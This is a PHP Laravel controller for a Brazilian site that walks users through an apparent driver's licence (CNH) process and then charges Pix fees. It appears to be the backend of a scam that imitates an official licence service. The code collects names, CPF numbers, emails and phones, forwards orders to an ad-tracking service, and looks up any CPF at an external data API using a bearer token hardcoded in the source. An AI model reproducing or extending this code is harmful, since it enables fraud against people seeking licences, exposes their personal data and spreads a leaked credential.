<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use App\Models\Transacao;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        $keysToCapture = [
            'utm_source',
            'utm_medium',
            'utm_campaign',
            'utm_content',
            'utm_term',
            'xcod',
            'sck',
            'keyword',
            'device',
            'network',
            'gbraid',
            'gad_source',
            'fbclid',
            'gclid',
            'adset_id',
            'ad_id',
            'campaign_id'
        ];

        foreach ($keysToCapture as $key) {
            $value = $request->query($key);

            if ($value) {
                session([$key => $value]);
            }
        }

        return view('home');
    }

    public function login()
    {
        return view('login');
    }

    public function cnhInfo()
    {
        return view('cnh-info');
    }

    public function verificacao()
    {
        return view('verificacao');
    }

    public function infosContato()
    {
        return view('informacoes-contato');
    }

    public function validacao()
    {
        return view('validacao');
    }

    public function questionario()
    {
        return view('questionario');
    }

    public function resultado()
    {
        return view('resultado');
    }

    public function endereco()
    {
        return view('endereco');
    }

    public function autoEscola()
    {
        return view('auto-escola');
    }

    public function aprovado()
    {
        return view('aprovado');
    }

    public function agendarExame()
    {
        return view('agendar-exame');
    }

    public function pix($code = 0)
    {
        $pedido = Transacao::where('transacao', $code)->first();
         
        if(!$pedido){
            return redirect('');
        }

        return view('pix', compact('pedido'));
    }

    public function pendencia()
    {
        return view('cadastro.pendencia');
    }

    public function adicaoCategoria()
    {
        return view('cadastro.adicao-categoria');
    }

    public function novaChance()
    {
        return view('cadastro.seguro-reprova');
    }

    public function concluido()
    {
        return view('cadastro.concluido');
    }

    private function gerarPagamento($valor, $cpf, $nome, $email, $telefone)
    {
        $amountInCents = intval(floatval($valor) * 100);
        $doc = preg_replace('/\D/', '', $cpf);
        $phone = preg_replace('/\D/', '', $telefone);
        
        $url = env('GATEWAY_API_URL');
        $publicKey = env('GATEWAY_PUBLIC_KEY');
        $secretKey = env('GATEWAY_SECRET_KEY');
        $auth = 'Basic ' . base64_encode($publicKey . ':' . $secretKey);

        $body = [
            "paymentMethod" => "pix",
            "customer" => [
                "document" => [
                    "number" => $doc,
                    "type" => "cpf"
                ],
                "name" => $nome,
                "email" => $email,
                "phone" => $phone
            ],
            "postbackUrl" => env('GATEWAY_CALLBACK'),
            "pix" => ["expiresInDays" => 3],
            "amount" => $amountInCents,
            "items" => [
                [
                    "tangible" => false,
                    "title" => "CN_".uniqid(),
                    "unitPrice" => $amountInCents,
                    "quantity" => 1
                ]
            ]
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Accept: application/json",
            "Authorization: $auth",
            "Content-Type: application/json"
        ]);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $paymentData = json_decode($response, true);

        return $paymentData;
    }

    private function sendUtmify($servico, $valor, $transacao, $status, $nome, $email, $telefone, $cpf, $product_id, $sck, $utm_source, $utm_campaign, $utm_medium, $utm_content, $utm_term, $created, $aproved)
    {
        $amount = intval($valor * 100);
        $doc = preg_replace('/\D/', '', $cpf);
        $phone = preg_replace('/\D/', '', $telefone);
            
        $payload = [
            'orderId' => $transacao,
            'platform' => 'CN',
            'paymentMethod' => 'pix',
            'status' => $status,
            'createdAt' => $created,
            'approvedDate' => $aproved,
            'refundedAt' => null,
            'customer' => [
                'name' => $nome,
                'email' => $email,
                'phone' => $phone,
                'document' => $doc,
                'country' => 'BR',
                'ip' => ''
            ],
            'products' => [
                [
                    'id' => $product_id,
                    'name' => $servico,
                    'planId' => null,
                    'planName' => null,
                    'quantity' => 1,
                    'priceInCents' => $amount,
                ]
            ],
            'trackingParameters' => [
                'src' => null,
                'sck' => $sck ?: null,
                'utm_source' => $utm_source ?: null,
                'utm_campaign' => $utm_campaign ?: null,
                'utm_medium' => $utm_medium ?: null,
                'utm_content' => $utm_content ?: null,
                'utm_term' => $utm_term ?: null,
            ],
            'commission' => [
                'totalPriceInCents' => $amount,
                'gatewayFeeInCents' => 0,
                'userCommissionInCents' => $amount
            ],
            'isTest' => false
        ];
        
        $headers = [
            'Content-Type: application/json',
            'x-api-token: '.env('UTMIFY_TOKEN')
        ];
        
        $ch = curl_init('https://api.utmify.com.br/api-credentials/orders');
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => json_encode($payload),
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $utmifyResponse = json_decode($response, true);
        
        return $utmifyResponse;
    }

    public function processar(Request $request)
    {
        $servico = $request->input('servico');
        $nome = $request->input('nome');
        $cpf = $request->input('cpf');
        $email = $request->input('email');
        $telefone = $request->input('telefone');
        $valor = $request->input('valor');

        $paymentData = $this->gerarPagamento($valor, $cpf, $nome, $email, $telefone);

        if(array_key_exists('id', $paymentData) && array_key_exists('pix', $paymentData) && array_key_exists('qrcode', $paymentData['pix'])) {
            $product_id = uniqid();
            $transaction = $paymentData['id'];
            $copiaCola = $paymentData["pix"]["qrcode"];
            $qrcode = "https://quickchart.io/qr?text=" . urlencode($paymentData["pix"]["qrcode"]) . "&ecLevel=Q&margin=0&size=300";

            $xcod = session('sck') ?? '';
            $sck = session('sck') ?? '';
            $utm_source = session('utm_source') ?? '';
            $utm_campaign = session('utm_campaign') ?? '';
            $utm_medium = session('utm_medium') ?? '';
            $utm_content = session('utm_content') ?? '';
            $utm_term = session('utm_term') ?? '';
            $keyword = session('keyword') ?? '';
            $device = session('device') ?? '';
            $network = session('network') ?? '';
            $gclid = session('gclid') ?? '';
            $gad_source = session('gad_source') ?? '';
            $gbraid = session('gbraid') ?? '';

            ini_set('date.timezone', 'America/Sao_Paulo');
            $dataHora = date('Y-m-d H:i:s');

            $transacao = new Transacao;
            $transacao->servico = $servico;
            $transacao->valor = $valor;
            $transacao->nome = $nome;
            $transacao->cpf = $cpf;
            $transacao->email = $email;
            $transacao->telefone = $telefone;
            $transacao->transacao = $transaction;
            $transacao->qrcode = $qrcode;
            $transacao->copiacola = $copiaCola;
            $transacao->dominio = env('APP_URL');
            $transacao->utm_source = $utm_source;
            $transacao->utm_campaign = $utm_campaign;
            $transacao->utm_medium = $utm_medium;
            $transacao->utm_content = $utm_content;
            $transacao->utm_term = $utm_term;
            $transacao->xcod = $xcod;
            $transacao->sck = $sck;
            $transacao->keyword = $keyword;
            $transacao->device = $device;
            $transacao->network = $network;
            $transacao->gclid = $gclid;
            $transacao->gad_source = $gad_source;
            $transacao->gbraid = $gbraid;
            $transacao->product_id = $product_id;

            $transacao->save();

            if($transacao->id){
                $status = 'waiting_payment';
                $created = $transacao->created_at;
                $utm = $this->sendUtmify($servico, $valor, $transaction, $status, $nome, $email, $telefone, $cpf, $product_id, $sck, $utm_source, $utm_campaign, $utm_medium, $utm_content, $utm_term, $created, null);

                return response()->json([
                    "success" => true,
                    "id" => $transaction,
                    "utmify" => $utm
                ]);
            }else{
                return response()->json([
                    "success" => false,
                    "resposta" => "Erro ao salvar os dados"
                ]);
            }
        }else{
            return response()->json([
                "success" => false,
                "resposta" => "Erro ao gerar pagamento"
            ]);
        }
    }

    public function confirmar(Request $request)
    {
        $transaction = $request->input('transactionId') ?? '';
        $transacao = Transacao::where('transacao', $transaction)->where('payment', 'paid')->first();
        if($transacao){
            return response()->json([
                "success" => true
            ]);
        }else{
           return response()->json([
                "success" => false,
                "msg" => 'Aguardando pagamento'
            ]); 
        }
    }
    
    public function callback(Request $request)
    {
        $data = $request->all();
        if (!isset($data['data']['id']) || !isset($data['data']['status'])) {
            return response()->json(['error' => 'Invalid data'], 400);
        }
        $transacao = $data['data']['id'];
        $status = $data['data']['status'];
        $order = Transacao::where('transacao', $transacao)->first();

        if($order && $status == 'paid'){
            $order->payment = 'paid';
            $order->save();

            $servico = $order->servico;
            $valor = $order->valor;
            $status = 'paid';
            $nome = $order->nome;
            $telefone = $order->telefone;
            $email = $order->email;
            $cpf = $order->cpf;
            $product_id = $order->product_id;
            $sck = $order->sck;
            $utm_source = $order->utm_source;
            $utm_campaign = $order->utm_campaign;
            $utm_medium = $order->utm_medium;
            $utm_content = $order->utm_content;
            $utm_term = $order->utm_term;
            $created = $order->created_at;
            $aproved = $order->updated_at;

            $utm = $this->sendUtmify($servico, $valor, $transacao, $status, $nome, $email, $telefone, $cpf, $product_id, $sck, $utm_source, $utm_campaign, $utm_medium, $utm_content, $utm_term, $created, $aproved);

            return response()->json([
                "success" => true,
                "msg" => 'Transação atualizada',
                "utm" => $utm,
            ]);
        }else{
            return response()->json([
                "success" => false,
                "msg" => 'Transação não localizada'
            ]);
        }
    }

    public function consultar(Request $request)
    {
        $cpf = preg_replace('/\D/', '', $request->cpf);

        if (!$cpf || strlen($cpf) != 11) {
            return response()->json(['error' => 'CPF inválido'], 422);
        }

        $bearer = '26ee7f99b8ce854ebe17322c5da297639dc2063abad686c6253a964167e96b4a';
        $url = "https://api.bluenext2.online/api/v1/consult/{$cpf}";
    
        try {
            $ch = curl_init();
    
            $headers = [
                "Authorization: Bearer {$bearer}",
                "Accept: application/json",
            ];
    
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_SSL_VERIFYPEER => true,
                CURLOPT_SSL_VERIFYHOST => 2,
            ]);
    
            $body = curl_exec($ch);
            $curlErr = curl_error($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
            curl_close($ch);
    
            if ($curlErr) {
                return response()->json([
                    'success' => false,
                    'error' => 'Erro na requisição cURL: ' . $curlErr,
                ], 500);
            }
    
            $json = null;
            if (!empty($body)) {
                $json = json_decode($body, true);
            }
    
            if ($httpCode >= 200 && $httpCode < 300) {
                return response()->json([
                    'success' => true,
                    'data' => $json !== null ? $json : $body,
                ]);
            }

            return response()->json([
                'success' => false,
                'error' => 'Falha na consulta do CPF.',
                'http_code' => $httpCode,
                'body' => $json !== null ? $json : $body,
            ], $httpCode ?: 400);
    
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'error' => $e->getMessage(),
            ], 500);
        }
    }
}
